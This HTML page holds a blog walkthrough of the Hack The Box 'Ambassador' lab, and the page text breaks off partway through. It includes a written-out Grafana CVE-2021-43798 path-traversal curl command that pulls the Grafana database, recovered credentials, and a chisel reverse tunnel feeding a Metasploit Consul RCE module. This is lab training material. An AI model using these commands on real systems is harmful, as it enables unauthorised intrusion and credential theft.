<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service | 3NNL's stuff</title><meta name=keywords content="hackthebox,path traversal,CVE-2021-43798,RCE"><meta name=description content="HTB Ambassador walkthrough."><meta name=author content="Me"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://examplesite.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service"><meta property="og:description" content="HTB Ambassador walkthrough."><meta property="og:type" content="article"><meta property="og:url" content="https://examplesite.com/posts/ambasador/"><meta property="og:image" content="https://examplesite.com/ambassador/static_1.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-16T11:30:03+00:00"><meta property="article:modified_time" content="2022-09-16T11:30:03+00:00"><meta property="og:site_name" content="Blog | 3nnl"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://examplesite.com/ambassador/static_1.png"><meta name=twitter:title content="HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service"><meta name=twitter:description content="HTB Ambassador walkthrough."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://examplesite.com/posts/"},{"@type":"ListItem","position":2,"name":"HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service","item":"https://examplesite.com/posts/ambasador/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service","name":"HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service","description":"HTB Ambassador walkthrough.","keywords":["hackthebox","path traversal","CVE-2021-43798","RCE"],"articleBody":"Recon nmap: 22/SSH, 80/HTTP, 3000/unknown, 3306/MySQL.\n1 2 3 4 5 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 3000/tcp open ppp? 3306/tcp open mysql MySQL 8.0.30-0ubuntu0.20.04.2 Checking the web application on port 80 we notice a hint of an attack vector: Checking the cookies, we will see that we have the grafana_session session cookie, which means that the machine uses the sysadmin service Grafana, whose authorization page port is, by default, exactly 3000.\nBy knocking on http://amba.htb:3000/, we will get a redirect to the authorization page: Realised that this version of Grafana has a CVE-2021-43798 path traversal vulnerability, it allows to access system files using plugins from Grafana service.\nCVE-2021-43798 https://www.exploit-db.com/exploits/50581 https://github.com/julesbozouklian/CVE-2021-43798\nUsing Metasploit: After successfully exploited the vulnerability, got the /etc/grafana/grafana.ini config, where we find the Grafana database credentials and its location:\n1 2 3 4 5 6 7 8 9 10 11 12 # Either \"mysql\", \"postgres\" or \"sqlite3\", it's your choice ;type = sqlite3 ;host = 127.0.0.1:3306 ;name = grafana ;user = root ... #################################### Paths ########################## [paths] # Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used) ;data = /var/lib/grafana Knowing the name of the database and having access to it through the alertlist plugin dump it via curl:\n1 \u003e curl --path-as-is http://amba.htb:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 \u003e sqlite3 grafana.db SQLite version 3.39.4 2022-09-29 15:55:41 Enter \".help\" for usage hints. sqlite\u003e .help .archive ... Manage SQL archives .auth ON|OFF Show authorizer callbacks .backup ?DB? FILE Backup DB (default \"main\") to FILE .bail on|off Stop after hitting an error. Default OFF .binary on|off Turn binary output on or off. Default OFF .cd DIRECTORY Change the working directory to DIRECTORY .changes on|off Show number of rows changed by SQL .check GLOB Fail if output since .testcase does not match .clone NEWDB Clone data into NEWDB from the existing database .connection [close] [#] Open or close an auxiliary database connection .databases List names and files of attached databases .dbconfig ?op? ?val? List or change sqlite3_db_config() options .dbinfo ?DB? Show status information about the database .dump ?OBJECTS? Render database content as SQL .echo on|off Turn command echo on or off .eqp on|off|full|... Enable or disable automatic EXPLAIN QUERY PLAN .excel Display the output of next command in spreadsheet .exit ?CODE? Exit this program with return-code CODE .expert EXPERIMENTAL. Suggest indexes for queries .explain ?on|off|auto? Change the EXPLAIN formatting mode. Default: auto .filectrl CMD ... Run various sqlite3_file_control() operations .fullschema ?--indent? Show schema and the content of sqlite_stat tables .headers on|off Turn display of headers on or off .help ?-all? ?PATTERN? Show help text for PATTERN .import FILE TABLE Import data from FILE into TABLE .imposter INDEX TABLE Create imposter table TABLE on index INDEX .indexes ?TABLE? Show names of indexes .limit ?LIMIT? ?VAL? Display or change the value of an SQLITE_LIMIT .lint OPTIONS Report potential schema issues. .load FILE ?ENTRY? Load an extension library .log FILE|off Turn logging on or off. FILE can be stderr/stdout .mode MODE ?OPTIONS? Set output mode .nonce STRING Suspend safe mode for one command if nonce matches .nullvalue STRING Use STRING in place of NULL values .once ?OPTIONS? ?FILE? Output for the next SQL command only to FILE .open ?OPTIONS? ?FILE? Close existing database and reopen FILE .output ?FILE? Send output to FILE or stdout if FILE is omitted .parameter CMD ... Manage SQL parameter bindings .print STRING... Print literal STRING .progress N Invoke progress handler after every N opcodes .prompt MAIN CONTINUE Replace the standard prompts .quit Exit this program .read FILE Read input from FILE or command output .recover Recover as much data as possible from corrupt db. .restore ?DB? FILE Restore content of DB (default \"main\") from FILE .save ?OPTIONS? FILE Write database to FILE (an alias for .backup ...) .scanstats on|off Turn sqlite3_stmt_scanstatus() metrics on or off .schema ?PATTERN? Show the CREATE statements matching PATTERN .selftest ?OPTIONS? Run tests defined in the SELFTEST table .separator COL ?ROW? Change the column and row separators .sha3sum ... Compute a SHA3 hash of database content .shell CMD ARGS... Run CMD ARGS... in a system shell .show Show the current values for various settings .stats ?ARG? Show stats or turn stats on or off .system CMD ARGS... Run CMD ARGS... in a system shell .tables ?TABLE? List names of tables matching LIKE pattern TABLE .testcase NAME Begin redirecting output to 'testcase-out.txt' .testctrl CMD ... Run various sqlite3_test_control() operations .timeout MS Try opening locked tables for MS milliseconds .timer on|off Turn SQL timer on or off .trace ?OPTIONS? Output each SQL statement as it is run .vfsinfo ?AUX? Information about the top-level VFS .vfslist List all available VFSes .vfsname ?AUX? Print the name of the VFS stack .width NUM1 NUM2 ... Set minimum column widths for columnar output sqlite\u003e .tables alert login_attempt alert_configuration migration_log alert_instance ngalert_configuration alert_notification org alert_notification_state org_user alert_rule playlist alert_rule_tag playlist_item alert_rule_version plugin_setting annotation preferences annotation_tag quota api_key server_lock cache_data session dashboard short_url dashboard_acl star dashboard_provisioning tag dashboard_snapshot team dashboard_tag team_member dashboard_version temp_user data_source test_data kv_store user library_element user_auth library_element_connection user_auth_token sqlite\u003e .dump data_source PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE `data_source` ( `id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL , `org_id` INTEGER NOT NULL , `version` INTEGER NOT NULL , `type` TEXT NOT NULL , `name` TEXT NOT NULL , `access` TEXT NOT NULL , `url` TEXT NOT NULL , `password` TEXT NULL , `user` TEXT NULL , `database` TEXT NULL , `basic_auth` INTEGER NOT NULL , `basic_auth_user` TEXT NULL , `basic_auth_password` TEXT NULL , `is_default` INTEGER NOT NULL , `json_data` TEXT NULL , `created` DATETIME NOT NULL , `updated` DATETIME NOT NULL , `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0); INSERT INTO data_source VALUES(2,1,1,'mysql','mysql.yaml','proxy','','dontStandSoCloseToMe63221!','grafana','grafana',0,'','',0,X'7b7d','2022-09-01 22:43:03','2022-10-24 14:24:03',0,'{}',1,'uKewFgM4z'); COMMIT; After studying the database we find the password for MySQL, located on port 3306. Let’s connect:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u003e mysql --host amba.htb -u grafana -p Enter password: dontStandSoCloseToMe63221! Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 62 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input MySQL [(none)]\u003e SHOW DATABASES; +--------------------+ | Database | +--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+ 6 rows in set (0.137 sec) MySQL [(none)]\u003e use whackywidget Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [whackywidget]\u003e show tables; +------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0.132 sec) MySQL [whackywidget]\u003e select * from users; +-----------+------------------------------------------+ | user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | +-----------+------------------------------------------+ 1 row in set (0.134 sec) We get base64 encoded password.Decode it, connect via SSH and take the user.\n1 2 3 4 5 6 7 8 9 10 \u003e echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d anEnglishManInNewYork027468 \u003e ssh developer@amba.htb developer@amba.htb's password: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) Last login: Mon Oct 24 17:16:55 2022 from 10.10.16.43 bash-5.0$ ls snap user.txt Privelege Escalation Using linpeas, find the git repository:\n1 2 3 4 ╔══════════╣ Analyzing Github Files (limit 70) -rw-rw-r-- 1 developer developer 93 Sep 2 02:28 /home/developer/.gitconfig drwxrwxr-x 8 root root 4096 Mar 14 2022 /opt/my-app/.git 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 developer@ambassador:/opt/my-app/.git$ git log fatal: detected dubious ownership in repository at '/opt/my-app/.git' To add an exception for this directory, call: git config --global --add safe.directory /opt/my-app/.git developer@ambassador:/opt/my-app/.git$ git config --global --add safe.directory /opt/my-app/.git developer@ambassador:/opt/my-app/.git$ developer@ambassador:/opt/my-app/.git$ git log commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -\u003e main) Author: Developer \u003cdeveloper@ambassador.local\u003e Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55 Author: Developer \u003cdeveloper@ambassador.local\u003e Date: Sun Mar 13 23:44:45 2022 +0000 config script commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 Author: Developer \u003cdeveloper@ambassador.local\u003e Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLI commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51 Author: Developer \u003cdeveloper@ambassador.local\u003e Date: Sun Mar 13 22:44:11 2022 +0000 .gitignore developer@ambassador:/opt/my-app/.git$ developer@ambassador:/opt/my-app/.git$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55 commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55 Author: Developer \u003cdeveloper@ambassador.local\u003e Date: Sun Mar 13 23:44:45 2022 +0000 config script diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh new file mode 100755 index 0000000..35c08f6 --- /dev/null +++ b/whackywidget/put-config-in-consul.sh @@ -0,0 +1,4 @@ +# We use Consul for application config in production, this script will help set the correct values for the app +# Export MYSQL_PASSWORD before running + +consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD Find the token for the Consul service used on the machine.\n1 +consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD Also find out the version of the service:\n1 2 developer@ambassador:/opt/my-app/.git$ apt list | grep \"consul\" consul/focal,now 1.13.2-1 amd64 [installed] Find an exploit for the RCE in Metasploit: But we can’t use it, because of disabling UI on victim machine: So let’s set up a TCP tunneling from Ambassador machine to ours to exploit the vulnerability.\nhttps://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding.\nWe will use a chisel.\nOn the local machine:\n1 2 3 4 ~/tools\u003e ./chisel server -p 8080 --reverse 2022/10/24 22:58:49 server: Reverse tunnelling enabled 2022/10/24 22:58:49 server: Fingerprint ``tx4Ngv/UtweTvoIMDAuUoDe7G6BoF9m88xU+//DNXSM= 2022/10/24 22:58:49 server: Listening on http://0.0.0.0:8080 On the victim machine:\n1 2 3 developer@ambassador:~/.tmp$ ./chisel client 10.10.16.45:8080 R:8500:127.0.0.1:8500 2022/10/24 19:05:36 client: Connecting to ws://10.10.16.45:8080 2022/10/24 19:05:38 client: Connected (Latency 130.006367ms) Great, now we can access Consul at 127.0.0.1:8500.\nLet’s set the parameters for the pailoit in metasploit: Where RHOSTS and RPORT is the address to reach Consul, ACL_TOKEN is the previously found token, and LHOST and LPORT are the attacker’s machine.\nRun it and get the root. Pwned. ","wordCount":"1801","inLanguage":"en","image":"https://examplesite.com/ambassador/static_1.png","datePublished":"2022-09-16T11:30:03Z","dateModified":"2022-09-16T11:30:03Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://examplesite.com/posts/ambasador/"},"publisher":{"@type":"Organization","name":"3NNL's stuff","logo":{"@type":"ImageObject","url":"https://examplesite.com/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://examplesite.com/ accesskey=h title="Home (Alt + H)"><img src=https://examplesite.com/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://examplesite.com/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://examplesite.com/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://examplesite.com/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://examplesite.com/>Home</a>&nbsp;»&nbsp;<a href=https://examplesite.com/posts/>Posts</a></div><h1 class=post-title>HTB Ambassador: Path Traversal CVE-2021-43798 and RCE in Consul service</h1><div class=post-description>HTB Ambassador walkthrough.</div><div class=post-meta><span title='2022-09-16 11:30:03 +0000 +0000'>September 16, 2022</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1801 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/ambasador.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://examplesite.com/ambassador/static_1.png alt><p></p></figure><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#cve-2021-43798>CVE-2021-43798</a></li><li><a href=#privelege-escalation>Privelege Escalation</a><ul><li><a href=#pwned>Pwned.</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><p><code>nmap</code>: <strong>22</strong>/SSH, <strong>80</strong>/HTTP, <strong>3000</strong>/unknown, <strong>3306</strong>/MySQL.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT    STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>80/tcp   open http   Apache httpd 2.4.41 ((Ubuntu))
</span></span><span class=line><span class=cl>3000/tcp open ppp?
</span></span><span class=line><span class=cl>3306/tcp open mysql  MySQL 8.0.30-0ubuntu0.20.04.2
</span></span></code></pre></td></tr></table></div></div><p>Checking the web application on port 80 we notice a hint of an attack vector:
<img loading=lazy src=/ambassador/static_2.png alt=media2></p><p>Checking the cookies, we will see that we have the <strong>grafana_session</strong> session cookie, which means that the machine uses the sysadmin service Grafana, whose authorization page port is, by default, exactly 3000.</p><p>By knocking on <a href=http://amba.htb:3000/>http://amba.htb:3000/</a>, we will get a redirect to the authorization page:
<img loading=lazy src=/ambassador/static_3.png alt=media2></p><p>Realised that this version of Grafana has a CVE-2021-43798 path traversal vulnerability, it allows to access system files using plugins from Grafana service.</p><h2 id=cve-2021-43798>CVE-2021-43798<a hidden class=anchor aria-hidden=true href=#cve-2021-43798>#</a></h2><p><a href=https://www.exploit-db.com/exploits/50581>https://www.exploit-db.com/exploits/50581</a>
<a href=https://github.com/julesbozouklian/CVE-2021-43798>https://github.com/julesbozouklian/CVE-2021-43798</a></p><p>Using Metasploit:
<img loading=lazy src=/ambassador/static_4.png alt=media2>
<img loading=lazy src=/ambassador/static_5.png alt=media2>
<img loading=lazy src=/ambassador/static_6.png alt=media2></p><p>After successfully exploited the vulnerability, got the /etc/grafana/grafana.ini config, where we find the Grafana database credentials and its location:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Either &#34;mysql&#34;, &#34;postgres&#34; or &#34;sqlite3&#34;, it&#39;s your choice</span>
</span></span><span class=line><span class=cl><span class=p>;</span><span class=nb>type</span> <span class=o>=</span> <span class=n>sqlite3</span>
</span></span><span class=line><span class=cl><span class=p>;</span><span class=n>host</span> <span class=o>=</span> <span class=mf>127.0.0.1</span><span class=p>:</span><span class=mi>3306</span>
</span></span><span class=line><span class=cl><span class=p>;</span><span class=n>name</span> <span class=o>=</span> <span class=n>grafana</span>
</span></span><span class=line><span class=cl><span class=p>;</span><span class=n>user</span> <span class=o>=</span> <span class=n>root</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#################################### Paths ##########################</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>paths</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)</span>
</span></span><span class=line><span class=cl><span class=p>;</span><span class=n>data</span> <span class=o>=</span> <span class=o>/</span><span class=n>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>grafana</span>
</span></span></code></pre></td></tr></table></div></div><p>Knowing the name of the database and having access to it through the alertlist plugin dump it via curl:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; curl --path-as-is http://amba.htb:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>&gt;</span><span class=w> </span><span class=n>sqlite3</span><span class=w> </span><span class=n>grafana</span><span class=p>.</span><span class=n>db</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>SQLite</span><span class=w> </span><span class=k>version</span><span class=w> </span><span class=mi>3</span><span class=p>.</span><span class=mi>39</span><span class=p>.</span><span class=mi>4</span><span class=w> </span><span class=mi>2022</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>29</span><span class=w> </span><span class=mi>15</span><span class=p>:</span><span class=mi>55</span><span class=p>:</span><span class=mi>41</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Enter</span><span class=w> </span><span class=s2>&#34;.help&#34;</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>usage</span><span class=w> </span><span class=n>hints</span><span class=p>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>sqlite</span><span class=o>&gt;</span><span class=w> </span><span class=p>.</span><span class=n>help</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>archive</span><span class=w> </span><span class=p>...</span><span class=w>            </span><span class=n>Manage</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=n>archives</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>auth</span><span class=w> </span><span class=k>ON</span><span class=o>|</span><span class=k>OFF</span><span class=w>            </span><span class=k>Show</span><span class=w> </span><span class=n>authorizer</span><span class=w> </span><span class=n>callbacks</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>backup</span><span class=w> </span><span class=o>?</span><span class=n>DB</span><span class=o>?</span><span class=w> </span><span class=n>FILE</span><span class=w>       </span><span class=n>Backup</span><span class=w> </span><span class=n>DB</span><span class=w> </span><span class=p>(</span><span class=k>default</span><span class=w> </span><span class=s2>&#34;main&#34;</span><span class=p>)</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>FILE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=n>bail</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>            </span><span class=n>Stop</span><span class=w> </span><span class=k>after</span><span class=w> </span><span class=n>hitting</span><span class=w> </span><span class=n>an</span><span class=w> </span><span class=n>error</span><span class=p>.</span><span class=w> </span><span class=k>Default</span><span class=w> </span><span class=k>OFF</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>.</span><span class=nb>binary</span><span class=w> </span><span class=k>on</span><span class=o>|</span><span class=k>off</span><span class=w>          </span><span class=n>Turn</span><span class=w> </span><span class=nb>binary</span><span class=w> </span><span class=k>output</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>off</span><span class=p>.</span><span class=w> </span><span class=k>Default</span><span class=w> </span><span class=k>OFF</span><span class=w>
